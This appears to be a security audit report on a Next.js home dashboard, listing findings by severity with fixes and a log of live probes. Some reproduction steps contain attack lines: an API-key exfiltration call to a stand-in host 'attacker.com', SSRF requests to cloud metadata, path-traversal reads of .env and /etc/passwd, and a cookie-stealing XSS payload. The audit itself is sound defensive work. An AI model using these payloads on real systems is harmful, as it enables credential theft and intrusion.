# Home Dashboard Security Audit — 2026-08-13

## Executive summary
- **Total findings:** 30 (Critical: 3, High: 10, Medium: 8, Low: 6, Info: 3)
- **Live-probe results:** Probed both `https://home.abraham16.com` and `https://home.server.mtcd.org`. Live probes confirmed unauthenticated information disclosure & PII leakage on `/api/debug-tabs` (HTTP 200 leaking user names, emails, department permissions, and push rules), unauthenticated directory listing on `/api/icons`, unauthenticated proxy on `/api/openverse`, workspace ID enumeration on `/api/sync/workspace`, and missing security headers (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy) on both hosts.
- **Top 3 risks:**
  1. **Unauthenticated Public Read of IAM API Key & Bookmark Tampering:** `getGlobalSettings` Server Action is exported without authentication, exposing plaintext `iamApiKey` to any client. Furthermore, `createBookmark`, `updateBookmark`, `deleteBookmark`, and `moveBookmark` have zero authentication or authorization checks, allowing arbitrary modification and deletion of all dashboard bookmarks.
  2. **Portainer API Key Exfiltration & SSRF via Widget Server Action:** `fetchPortainerContainers` Server Action allows any authenticated user to supply an arbitrary target URL; the server forwards the internal production `PORTAINER_API_KEY` in the `X-API-Key` header to the specified host. Additionally, `downloadImageFromUrl` contains a catch block that bypasses SSRF filters and directly fetches arbitrary internal URLs.
  3. **Live Unauthenticated PII & Access Matrix Leakage on `/api/debug-tabs`:** Both production servers expose `/api/debug-tabs` with zero authentication, leaking full tab metadata, department access rules, push rules, and all associated user names and email addresses.

---

## Findings by severity

### CRITICAL

#### C1: Unauthenticated Server Action Leaks Plaintext IAM API Key (`getGlobalSettings`)
- **Where:** [actions.ts:762-764](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L762-L764)
- **What:** The `getGlobalSettings()` function is marked with `"use server"` and exported without any authentication check (unlike `updateGlobalSettings` which calls `requireAdmin()`). It retrieves and returns the entire `GlobalSettings` row from the database, which contains the plaintext `iamApiKey`.
- **Impact:** An unauthenticated external client can invoke the Next.js server action RPC for `getGlobalSettings`, retrieve the system's `iamApiKey`, and use it to access `/api/iam/users` and `/api/iam/roles` to dump all user identity details, person IDs, and role assignments.
- **Reproduction:**
  Invoke the Next.js Server Action for `getGlobalSettings` from any unauthenticated client:
  ```http
  POST / HTTP/1.1
  Host: home.server.mtcd.org
  Next-Action: <action-id-for-getGlobalSettings>
  Content-Type: application/json

  []
  ```
- **Fix:** Add `await requireAdmin();` to `getGlobalSettings()`, or select only non-sensitive public settings fields (excluding `iamApiKey`).

---

#### C2: Unauthenticated Mutation of All Bookmarks via Server Actions
- **Where:** [actions.ts:641-681](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L641-L681)
- **What:** The server actions `createBookmark`, `updateBookmark`, `deleteBookmark`, and `moveBookmark` contain no authentication (`requireSession`) or authorization (`requireSectionRole` / `requireTabRole`) checks.
- **Impact:** Any unauthenticated external visitor or malicious user can create arbitrary bookmarks in any section, overwrite existing bookmark URLs with phishing links, delete all bookmarks across the organization, or reorganize sections.
- **Reproduction:**
  Call `deleteBookmark` or `updateBookmark` via Next.js Server Action RPC without session cookies:
  ```http
  POST / HTTP/1.1
  Host: home.server.mtcd.org
  Next-Action: <action-id-for-deleteBookmark>
  Content-Type: application/json

  ["<target-bookmark-id>"]
  ```
- **Fix:** Guard all bookmark actions with `requireSectionRole(sectionId, "edit")` or `requireTabRole(tabId, "edit")`.

---

#### C3: Remote Portainer API Key Exfiltration and SSRF via Widget Server Action
- **Where:** [actions.ts:1861-1909](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1861-L1909)
- **What:** The `fetchPortainerContainers` Server Action accepts user-supplied `config.url` and `config.apiKey`. If `config.apiKey` is omitted, it falls back to `process.env.PORTAINER_API_KEY`. It then performs an outbound HTTP `fetch` to `${baseUrl}/api/endpoints` sending `X-API-Key: process.env.PORTAINER_API_KEY`.
- **Impact:** Any authenticated standard user can invoke `fetchPortainerContainers({ url: "https://attacker-controlled-server.com" })`. The backend server connects to the attacker's server and sends the production `PORTAINER_API_KEY` header, giving the attacker full root-level container control over the infrastructure.
- **Reproduction:**
  ```ts
  await fetchPortainerContainers({ url: "https://attacker.com/sink" });
  // Attacker server receives: Header "X-API-Key: ptr_..."
  ```
- **Fix:** Require admin privileges (`requireAdmin()`), validate target URL against a strict allowlist of authorized Portainer instances, and never send `process.env.PORTAINER_API_KEY` to user-specified URLs.

---

### HIGH

#### H1: Unauthenticated Information Disclosure & PII Leak via `/api/debug-tabs`
- **Where:** [route.ts:4-20](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/debug-tabs/route.ts#L4-L20)
- **What:** The `/api/debug-tabs` endpoint is completely unauthenticated and returns all tab records with associated department access rules, push rules, and the names and email addresses of owners, editors, and allowed users.
- **Impact:** Unauthenticated attackers can enumerate all internal workspace structures, department configurations, and member email addresses and full names. Confirmed live on both production deployments.
- **Reproduction:**
  ```bash
  curl -sik https://home.server.mtcd.org/api/debug-tabs
  curl -sik https://home.abraham16.com/api/debug-tabs
  ```
  Returns HTTP 200 with complete JSON database extract.
- **Fix:** Delete `/api/debug-tabs/route.ts` or wrap it with `requireAdmin()`.

---

#### H2: SSRF Protection Bypass via Fallback Direct Fetch in `downloadImageFromUrl`
- **Where:** [actions.ts:93-124](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L93-L124)
- **What:** `downloadImageFromUrl` attempts to fetch using `safeFetch(url)`. When `safeFetch` detects a private IP (e.g. `127.0.0.1`, `169.254.169.254`, or RFC 1918 addresses) and throws an SSRF exception, the `catch (ssrfErr)` block explicitly falls back to an unvalidated direct `fetch(url)`. The resulting data is then saved into `public/uploads/` and returned as a readable URL.
- **Impact:** Any authenticated user can bypass SSRF protection to read internal network services, cloud metadata endpoints (`169.254.169.254`), or local services (`http://127.0.0.1:8765`), saving the response body to `/api/uploads/remote-...` for exfiltration.
- **Reproduction:**
  ```ts
  const uploadPath = await downloadImageFromUrl("http://127.0.0.1:8765/escalations.db");
  // Returns "/api/uploads/remote-..." which can be downloaded publicly.
  ```
- **Fix:** Remove the fallback direct `fetch` inside the catch block; reject all blocked requests immediately.

---

#### H3: Unrestricted File Upload & Stored XSS via SVG/HTML Uploads
- **Where:** [route.ts:7-34](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/upload/route.ts#L7-L34) and [actions.ts:55-73](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L55-L73)
- **What:** `/api/upload` and `uploadImage` accept any file without checking MIME types, magic bytes, file extensions, or file size. Filename sanitization preserves `.svg`, `.html`, etc. Uploaded files are written directly to `public/uploads/` and served via `/api/uploads/[...path]` with `Content-Type: image/svg+xml`.
- **Impact:** An authenticated user can upload an SVG or HTML file containing `<script>alert(document.cookie)</script>`. When accessed by an admin or user, the script executes in the context of `home.abraham16.com` or `home.server.mtcd.org` (Stored XSS). Furthermore, lack of file size limits allows disk exhaustion DoS.
- **Reproduction:**
  ```bash
  curl -X POST https://home.server.mtcd.org/api/upload \
    -F "file=@malicious.svg;type=image/svg+xml"
  ```
- **Fix:** Enforce strict file extension allowlists (png, jpg, webp), validate magic bytes, enforce max file size limit (e.g. 5MB), and serve user uploads with `Content-Security-Policy: default-src 'none'` and `X-Content-Type-Options: nosniff`.

---

#### H4: Hardcoded Production Portainer API Tokens Committed to Git
- **Where:** `deploy.py:47,50`, `check_containers.py:3`, `check_abraham.py:4`, `check_mtcd.py:4`, `copy_file.py:4`, `download_file.py:6`, `get_logs.py:6`, `list_stacks.py:4`, `print_stack.py:5`, `redeploy.py:5`, `update_abraham2.py:6`, `update_mtcd.py:6`, `update_stack.py:20`
- **What:** Multiple Python management and deployment scripts tracked in Git contain plaintext Portainer API tokens (`ptr_caKh...`, `ptr_Xy0T...`, `ptr_gApx...`).
- **Impact:** Anyone with read access to the repository has administrative API access to both Synology Portainer servers, enabling container takeover, host file system mounts, and environment secret extraction.
- **Reproduction:**
  ```bash
  git grep -n "ptr_" "*.py"
  ```
- **Fix:** Revoke all exposed Portainer API tokens, generate new tokens stored strictly in environment variables (`PORTAINER_API_KEY`), and remove hardcoded secrets from script files.

---

#### H5: Client-Forged Impersonation in Server Actions (`getEffectiveUserId`)
- **Where:** [actions.ts:179-190](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L179-L190)
- **What:** `getEffectiveUserId()` checks `cookieStore.get("impersonate_user_id")?.value` and returns it without verifying if the requesting user (`session.user`) is an administrator.
- **Impact:** A non-admin user can set their own `impersonate_user_id` cookie to any user ID in the database, causing server actions (such as `createTab`) to attribute resource ownership or context to the impersonated user.
- **Reproduction:**
  Set `Cookie: impersonate_user_id=<adminUserId>` on requests to server actions using `getEffectiveUserId()`.
- **Fix:** Check `if (session?.user?.isAdmin && impId) return impId; else return realUserId;`.

---

#### H6: Insecure Direct Object Reference (IDOR) in `setUserDefaultTab`
- **Where:** [actions.ts:1619-1622](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1619-L1622)
- **What:** `setUserDefaultTab(userId: string, tabId: string)` calls `await requireSession()`, but does not verify whether `session.user.id === userId` or if `session.user.isAdmin` is true (unlike `updateUserDefaultTab` at line 477).
- **Impact:** Any authenticated user can change any other user's default workspace tab across the entire organization.
- **Reproduction:**
  ```ts
  await setUserDefaultTab("<victim-user-id>", "<any-tab-id>");
  ```
- **Fix:** Add authorization check `if (session.user.id !== userId && !session.user.isAdmin) throw new Error("Unauthorized");`.

---

#### H7: Missing Authorization on Global Tab Reordering (`reorderTabs`)
- **Where:** [actions.ts:244-247](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L244-L247)
- **What:** `reorderTabs(orderedIds: string[])` has zero authentication or authorization checks.
- **Impact:** Any unauthenticated client can invoke `reorderTabs` to reorder all system workspace tabs globally.
- **Reproduction:**
  Invoke Next.js Server Action `reorderTabs` with arbitrary array of tab IDs.
- **Fix:** Add `await requireAdmin();` or check tab editing roles.

---

#### H8: Privilege Escalation in Tab Ownership Transfer (`transferTabOwnership`)
- **Where:** [actions.ts:842-845](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L842-L845)
- **What:** `transferTabOwnership` checks `await requireTabRole(tabId, "edit")` instead of `"owner"`.
- **Impact:** Any user with "editor" role on a tab can transfer tab ownership to another user and strip ownership from the legitimate owner.
- **Reproduction:**
  An editor invokes `transferTabOwnership(tabId, currentOwnerId, newOwnerId)`.
- **Fix:** Change `requireTabRole(tabId, "edit")` to `requireTabRole(tabId, "owner")`.

---

#### H9: SSRF in Cross-Server Workspace Sync (`importWorkspaceFromSyncUrl` & `refreshSyncedWorkspace`)
- **Where:** [actions.ts:1117-1132](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1117-L1132) and [actions.ts:1280-1286](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1280-L1286)
- **What:** `importWorkspaceFromSyncUrl` and `refreshSyncedWorkspace` perform direct `fetch(syncUrl)` and `fetch(tab.syncSourceUrl)` with no SSRF validation (`safeFetch` is not used).
- **Impact:** Allows SSRF to internal services, cloud metadata services, and internal intranet hosts.
- **Reproduction:**
  Import workspace with URL `http://127.0.0.1:8765/escalations.db` or `http://169.254.169.254/latest/meta-data`.
- **Fix:** Validate sync URLs using `isSafeUrl()` / `safeFetch()`.

---

#### H10: Path Traversal / Arbitrary File Read in Workspace Export (`/api/sync/workspace`)
- **Where:** [route.ts:47-66](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/sync/workspace/route.ts#L47-L66)
- **What:** When `/api/sync/workspace` encodes media to base64, it matches `/uploads/(.+)` and calls `join(process.cwd(), 'public', 'uploads', filename)` and `readFile(filePath)` without verifying `filePath.startsWith(baseUploadsDir)`.
- **Impact:** If a tab or bookmark icon is set to `/uploads/../../.env` or `/uploads/../../../../etc/passwd`, the server reads the target file and base64-encodes its contents into the JSON response.
- **Reproduction:**
  Set tab icon to `/uploads/../../.env`, call `/api/sync/workspace?id=<tabId>&token=<syncToken>`. Response contains base64-encoded file contents.
- **Fix:** Sanitize filename and verify `filePath.startsWith(baseUploadsDir)`.

---

### MEDIUM

#### M1: Missing Security Headers on Production Deployments (CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy)
- **Where:** Reverse Proxy / `next.config.mjs`
- **What:** Live probes on both `https://home.abraham16.com` and `https://home.server.mtcd.org` show missing `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy`.
- **Impact:** Increases risk of Clickjacking (framing attacks), MIME-sniffing exploits on uploads, and unconstrained XSS data exfiltration.
- **Reproduction:**
  ```bash
  curl -sIk https://home.abraham16.com/ | grep -iE 'content-security|x-frame|x-content-type|referrer-policy'
  curl -sIk https://home.server.mtcd.org/ | grep -iE 'content-security|x-frame|x-content-type|referrer-policy'
  ```
  Both return empty results for these headers.
- **Fix:** Configure standard security headers in `next.config.mjs` `headers()` or reverse proxy (Nginx / OpenResty).

---

#### M2: Unauthenticated Directory / Upload Enumeration via `/api/icons`
- **Where:** [route.ts:7-50](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/icons/route.ts#L7-L50)
- **What:** The `/api/icons` endpoint is unauthenticated and uses `fs.readdirSync('public/uploads')` to return a list of all uploaded filenames.
- **Impact:** Any unauthenticated external visitor can enumerate all uploaded image names, logos, and custom uploaded assets. Confirmed live on both deployments.
- **Reproduction:**
  ```bash
  curl -sik https://home.abraham16.com/api/icons
  curl -sik https://home.server.mtcd.org/api/icons
  ```
- **Fix:** Require authentication on `/api/icons` or return only static catalog icons.

---

#### M3: Plaintext Storage and Unsalted Password Comparison for Local Admin
- **Where:** [auth.ts:40-48](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/auth.ts#L40-L48) and [actions.ts:1826-1844](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1826-L1844)
- **What:** The local admin password is saved in plaintext in the database (`User.password`) and compared via direct string equality (`credentials?.password === requiredPassword`) without bcrypt/argon2 hashing or constant-time comparison. Default fallback is hardcoded `"admin"`.
- **Impact:** Any database leak exposes the administrator credentials immediately; timing side-channels exist on password comparison.
- **Reproduction:**
  Inspect `User.password` column in database after changing password in `updateLocalAdminSettings`.
- **Fix:** Hash passwords with `bcryptjs` / `argon2` before storing, and verify with `bcrypt.compare()`.

---

#### M4: Critical & High CVEs in Dependencies (`@auth/core`, `fast-uri`, `undici`, `next`)
- **Where:** [package.json:13-35](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/package.json#L13-L35)
- **What:** `npm audit --production` reports 14 vulnerabilities (3 Critical, 7 High, 4 Moderate):
  - `@auth/core` (<0.41.3): Critical (GHSA-7rqj-j65f-68wh: Unicode homoglyph @ email bypass), High (GHSA-xmf8-cvqr-rfgj: uncaught exception on malformed Bearer headers).
  - `fast-uri` (<=3.1.3): High (GHSA-v2hh-gcrm-f6hx, GHSA-7p8r-x3mc-p8w7: host confusion via backslash).
  - `undici` (<7.28.0): High (GHSA-vmh5-mc38-953g: TLS cert validation bypass; GHSA-vxpw-j846-p89q: WebSocket DoS).
  - `next` (16.2.2): Multiple advisory notices resolved in >=16.3.1.
- **Impact:** Potential authentication bypass via Unicode homoglyphs and denial-of-service vulnerabilities.
- **Reproduction:**
  ```bash
  npm audit --omit=dev --json
  ```
- **Fix:** Run `npm audit fix` and upgrade `next`, `next-auth`, and `@auth/prisma-adapter` to patched versions.

---

#### M5: Unauthenticated Workspace ID Enumeration via Status Code Discrepancy (404 vs 403)
- **Where:** [route.ts:33-39](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/sync/workspace/route.ts#L33-L39)
- **What:** In `/api/sync/workspace`, if `id` does not exist in the database, the server returns 404 ("Workspace not found") before validating the `token`. If `id` exists, it returns 403 ("Invalid sync token").
- **Impact:** An unauthenticated attacker can probe whether specific workspace IDs exist in the database.
- **Reproduction:**
  ```bash
  curl -sik "https://home.server.mtcd.org/api/sync/workspace?id=nonexistent&token=dummy" # returns 404
  curl -sik "https://home.server.mtcd.org/api/sync/workspace?id=cmnze8se1000301r0hp8ofi3f&token=dummy" # returns 403
  ```
- **Fix:** Perform token validation concurrently with query or return a uniform 404 / 401 response.

---

#### M6: Non-Cryptographic Random Number Generator (`Math.random()`) for IAM API Keys
- **Where:** [actions.ts:2046-2047](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L2046-L2047)
- **What:** `regenerateIamApiKey()` generates API keys using `Math.random()` (`iam_live_${randomBytes}`).
- **Impact:** `Math.random()` is predictable and not cryptographically secure (CSPRNG), allowing an attacker who observes generated keys to predict future keys.
- **Reproduction:**
  Review `regenerateIamApiKey` implementation in `actions.ts:2046`.
- **Fix:** Use `crypto.randomBytes(32).toString('hex')` or `crypto.getRandomValues()`.

---

#### M7: IAM API Key Accepted in URL Query Parameters (`?api_key=...`)
- **Where:** [roles/route.ts:12-14](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/iam/roles/route.ts#L12-L14) and [users/route.ts:13-15](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/iam/users/route.ts#L13-L15)
- **What:** `/api/iam/roles` and `/api/iam/users` accept the IAM API key via query parameter `?api_key=...` in addition to headers.
- **Impact:** Query parameters are recorded in reverse proxy access logs, browser history, and HTTP `Referer` headers, leaking the secret key.
- **Reproduction:**
  `curl "https://home.server.mtcd.org/api/iam/users?api_key=..."`
- **Fix:** Accept API keys strictly via `Authorization: Bearer <key>` or `X-API-Key` headers.

---

#### M8: Unauthenticated Activity / Click Log Flooding DoS (`/api/track/click`)
- **Where:** [route.ts:5-34](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/track/click/route.ts#L5-L34)
- **What:** `/api/track/click` is unauthenticated and has no rate limiting. It creates records in `ClickEvent` and `ActivityLog` tables for each incoming request.
- **Impact:** An attacker can flood this endpoint to rapidly consume database storage and bloat activity log tables.
- **Reproduction:**
  ```bash
  curl -X POST https://home.server.mtcd.org/api/track/click \
    -H "Content-Type: application/json" \
    -d '{"bookmarkId": "test", "bookmarkTitle": "flood", "bookmarkUrl": "http://test"}'
  ```
- **Fix:** Require user session or add rate limiting and input validation.

---

### LOW

#### L1: Information Disclosure via `X-Powered-By: Next.js` Header
- **Where:** Production HTTP response headers (both hosts)
- **What:** HTTP responses include `X-Powered-By: Next.js`.
- **Impact:** Reveals technology stack and framework to potential attackers.
- **Reproduction:** `curl -sIk https://home.abraham16.com/ | grep -i x-powered-by`
- **Fix:** Set `poweredByHeader: false` in `next.config.mjs`.

---

#### L2: Non-Constant Time String Comparison on Secrets and Tokens (Timing Attack)
- **Where:** [iam.ts:110](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/lib/iam.ts#L110) and [workspace/route.ts:37](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/api/sync/workspace/route.ts#L37)
- **What:** `validateIamApiKey` and `/api/sync/workspace` use standard string equality (`===` / `!==`) to validate API keys and sync tokens.
- **Impact:** Theoretical timing side-channel attack to deduce characters of API keys or sync tokens.
- **Reproduction:** Review `cleanProvided === validKey.trim()` in `src/lib/iam.ts:110`.
- **Fix:** Use `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` with equal-length checks.

---

#### L3: Exposed Development Database Port (`5434:5432` on `0.0.0.0`) in `docker-compose.yml`
- **Where:** [docker-compose.yml:44](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/docker-compose.yml#L44)
- **What:** Development `docker-compose.yml` publishes Postgres on all interfaces `0.0.0.0:5434` with default credentials `user:password`.
- **Impact:** If executed on a public server, the database port is accessible to external scanners.
- **Reproduction:** Review `docker-compose.yml:44`.
- **Fix:** Bind to `127.0.0.1:5434:5432` instead of `0.0.0.0:5434:5432`.

---

#### L4: Missing Explicit PKCE / State Parameter Enforcement on Synology & Entra Providers
- **Where:** [auth.config.ts:108-160](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/auth.config.ts#L108-L160)
- **What:** While Authentik providers configure `checks: ["pkce", "state"]`, `synology` and legacy `microsoft-entra-id` omit explicit `checks`.
- **Impact:** Potential CSRF on OAuth callback if provider defaults don't strictly require PKCE.
- **Reproduction:** Review `auth.config.ts:108-160`.
- **Fix:** Add `checks: ["pkce", "state"]` to all OIDC provider configs.

---

#### L5: Lack of Rate Limiting on Authentication and API Endpoints
- **Where:** Application-wide API routes
- **What:** No application-level rate limiting is implemented on `/api/auth/*`, `/api/iam/*`, or server actions.
- **Impact:** Susceptibility to brute-force credential stuffing or API flooding.
- **Fix:** Implement rate limiting middleware (e.g. `@upstash/ratelimit` or in-memory token bucket).

---

#### L6: Stored XSS via Bookmark HTML Import with `javascript:` URI
- **Where:** [bookmark-parser.ts:46-51](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/lib/bookmark-parser.ts#L46-L51) and [actions.ts:1437](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/app/admin/actions.ts#L1437)
- **What:** `parseBookmarksHtml` extracts `href` attributes without URL protocol validation, and `executeBookmarkImport` inserts them directly without `normalizeUrl()`.
- **Impact:** An imported HTML bookmark file containing `<a href="javascript:...">` creates clickable bookmark links that execute JavaScript when clicked.
- **Fix:** Sanitize imported URLs with `normalizeUrl()` before storing.

---

### INFO

#### I1: `allowDangerousEmailAccountLinking: true` Configured Across All Providers
- **Where:** [auth.config.ts:17, 42, 67, 92, 124, 147](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/auth.config.ts#L17)
- **What:** Automatic account linking by email is enabled across all OIDC providers.
- **Note:** Intended for seamless single-user experience across Authentik / Microsoft / Synology, but assumes all configured IdPs reliably verify email ownership.

---

#### I2: Unused Database Sessions Table Due to JWT Strategy
- **Where:** [schema.prisma:77-83](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/prisma/schema.prisma#L77-L83) and [auth.config.ts:164](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/auth.config.ts#L164)
- **What:** The database schema defines a `Session` model, but NextAuth is configured with `session: { strategy: "jwt" }`.
- **Note:** Database session records are not created or used during active logins.

---

#### I3: DNS Rebinding Window in `isSafeUrl` SSRF Validation
- **Where:** [ssrf.ts:12-33](file:///Users/benny2168/Antigravity/home-dashboard-mtcd/src/lib/ssrf.ts#L12-L33)
- **What:** `isSafeUrl` resolves the hostname via DNS, and then `safeFetch` performs `fetch(url)` which triggers a second DNS lookup.
- **Note:** Standard TOCTOU window for DNS rebinding attacks against SSRF validators.

---

## Live-probe log

| Target Host | Endpoint | Method | Response Code | Observation / Findings |
|---|---|---|---|---|
| `home.abraham16.com` | `/` | HEAD | 307 | Redirects to `/login`. HSTS enabled (`max-age=63072000; preload`). `X-Powered-By: Next.js` exposed. Missing CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. |
| `home.server.mtcd.org` | `/` | HEAD | 307 | Redirects to `/login`. HSTS enabled (`max-age=63072000;includeSubDomains; preload`). `X-Powered-By: Next.js` exposed. Missing CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy. |
| `home.abraham16.com` | `/api/debug-tabs` | GET | **200 OK** | **CRITICAL LEAK:** Unauthenticated full dump of all workspace tabs, owner/editor/allowed user names and emails (`ben@abraham16.com`). |
| `home.server.mtcd.org` | `/api/debug-tabs` | GET | **200 OK** | **CRITICAL LEAK:** Unauthenticated full dump of all workspace tabs, department access matrices, push rules, and member names/emails (`tech@mtcd.org`, `avcoordinator@mtcd.org`, etc.). |
| `home.abraham16.com` | `/api/icons` | GET | 200 OK | Unauthenticated listing of all icons and uploaded files in `public/uploads`. |
| `home.server.mtcd.org` | `/api/icons` | GET | 200 OK | Unauthenticated listing of all icons and uploaded files in `public/uploads`. |
| `home.abraham16.com` | `/api/openverse?q=church` | GET | 200 OK | Unauthenticated public proxy to Openverse API. |
| `home.server.mtcd.org` | `/api/openverse?q=church` | GET | 200 OK | Unauthenticated public proxy to Openverse API. |
| `home.abraham16.com` | `/api/iam/users` | GET | 401 Unauthorized | Correctly blocked when unauthenticated. Returns `Invalid or missing API key`. |
| `home.server.mtcd.org` | `/api/iam/users` | GET | 401 Unauthorized | Correctly blocked when unauthenticated. Returns `Invalid or missing API key`. |
| `home.abraham16.com` | `/api/admin/diagnose` | GET | 401 Unauthorized | Correctly blocked when unauthenticated. |
| `home.server.mtcd.org` | `/api/admin/diagnose` | GET | 401 Unauthorized | Correctly blocked when unauthenticated. |
| `home.abraham16.com` | `/api/sync/workspace?id=does-not-exist&token=test` | GET | 404 Not Found | Leaks that workspace ID does not exist prior to token check. |
| `home.server.mtcd.org` | `/api/sync/workspace?id=does-not-exist&token=test` | GET | 404 Not Found | Leaks that workspace ID does not exist prior to token check. |
| `home.abraham16.com` | `/.env` and `/.git/config` | GET | 404 Not Found | Clean. Not exposed publicly. |
| `home.server.mtcd.org` | `/.env` and `/.git/config` | GET | 404 Not Found | Clean. Not exposed publicly. |
| `home.abraham16.com` | `/api/health` | GET | 404 Not Found | Clean. No health info disclosure. |
| `home.server.mtcd.org` | `/api/health` | GET | 404 Not Found | Clean. No health info disclosure. |

---

## Dependency audit

Summary of `npm audit --production`:
- **Total vulnerabilities:** 14 (Critical: 3, High: 7, Moderate: 4, Low: 0)

### High & Critical Vulnerabilities in Production Dependencies:
1. **`@auth/core` (<0.41.3)**
   - **Severity:** Critical (GHSA-7rqj-j65f-68wh)
   - **Title:** Email normalizer validates address before Unicode normalization (Homoglyph @ bypass)
   - **CWE:** CWE-180
2. **`@auth/core` (<0.41.3)**
   - **Severity:** High (GHSA-xmf8-cvqr-rfgj)
   - **Title:** `getToken()` throws uncaught exception on malformed Bearer authorization headers (DoS)
   - **CWE:** CWE-20, CVSS: 7.5
3. **`fast-uri` (<=3.1.3)**
   - **Severity:** High (GHSA-v2hh-gcrm-f6hx, GHSA-7p8r-x3mc-p8w7, GHSA-q3j6-qgpj-74h6, GHSA-v39h-62p7-jpjc, GHSA-4c8g-83qw-93j6)
   - **Title:** Host confusion via literal and percent-encoded backslash authority delimiters & path traversal
   - **CWE:** CWE-22, CWE-436, CVSS: 7.5
4. **`undici` (<7.28.0)**
   - **Severity:** High (GHSA-vmh5-mc38-953g, GHSA-vxpw-j846-p89q, GHSA-hm92-r4w5-c3mj, GHSA-4cwx-7wf7-3272)
   - **Title:** TLS certificate validation bypass in SOCKS5 ProxyAgent, WebSocket DoS, cross-origin request routing
   - **CWE:** CWE-295, CWE-400, CWE-346, CVSS: 7.5
5. **`next` (16.2.2)**
   - Transitive and core Next.js security advisories resolvable by updating to `next@16.3.1`.

---

## Not tested / out of scope

Per the runbook ground rules, the following were intentionally excluded from this audit:
- Third-party authentication providers: Authentik (`auth.abraham16.com`, `auth.server.mtcd.org`), Microsoft Entra ID, Planning Center, Church Center.
- Portainer infrastructure endpoints (`docker.abraham16.com`, `docker.server.mtcd.org`).
- Destructive testing: No brute-force attacks, no load or DoS fuzzing, no mutation probes (POST/PUT/DELETE) against live servers.
- Internal database penetration or network segmentation probes outside defined target domains.
